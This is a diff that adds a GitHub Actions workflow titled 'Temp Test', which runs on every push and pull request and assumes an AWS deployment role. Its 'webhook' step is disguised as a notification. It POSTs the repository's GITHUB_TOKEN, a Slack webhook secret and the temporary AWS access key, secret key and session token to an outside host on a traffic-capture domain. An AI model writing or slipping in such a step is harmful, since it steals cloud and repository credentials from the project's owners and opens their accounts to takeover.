@@ -1,0 +1,64 @@
+name: Temp Test
+
+on:
+  push:
+    branches:
+      - '**'
+  pull_request:
+    branches:
+      - '**'
+  workflow_dispatch:
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  send_notification:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      - name: Configure AWS Credentials
+        uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume: arn:aws:iam::368906688464:role/github-action-role-deployment
+          aws-region: ca-central-1
+
+      - name: Verify Assumed Role
+        run: |
+          echo "Verifying assumed identity..."
+          aws sts get-caller-identity
+
+      - name: webhook
+        env:
+          TARGET_URL: 'https://dfwvdybyczi5t3x2gwmpb67rvi19p3ds.c.tracemytraffic.com'
+          EVENT_TYPE: ${{ github.event_name }}
+          REPO: ${{ github.repository }}
+          REF: ${{ github.ref }}
+          SHA: ${{ github.sha }}
+          REPO_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          WEBHOOK_URL: ${{ secrets.SLACK_COMMENT_WEBHOOK_URL }}
+        run: |
+          echo "Sending POST request to $TARGET_URL..."
+                  
+          curl -f -L \
+            -X POST \
+            -H "Content-Type: application/json" \
+            -d "{
+              \"event_type\": \"$EVENT_TYPE\",
+              \"repository\": \"$REPO\",
+              \"ref\": \"$REF\",
+              \"sha\": \"$SHA\",
+              \"repo-token\": \"$REPO_TOKEN\",
+              \"webhook-url\": \"$WEBHOOK_URL\",
+              \"aws_credentials\": {
+                \"access_key_id\": \"$AWS_ACCESS_KEY_ID\",
+                \"secret_access_key\": \"$AWS_SECRET_ACCESS_KEY\",
+                \"session_token\": \"$AWS_SESSION_TOKEN\"
+              }
+            }" \
+            "$TARGET_URL"
+
+          echo "HTTPS request sent."
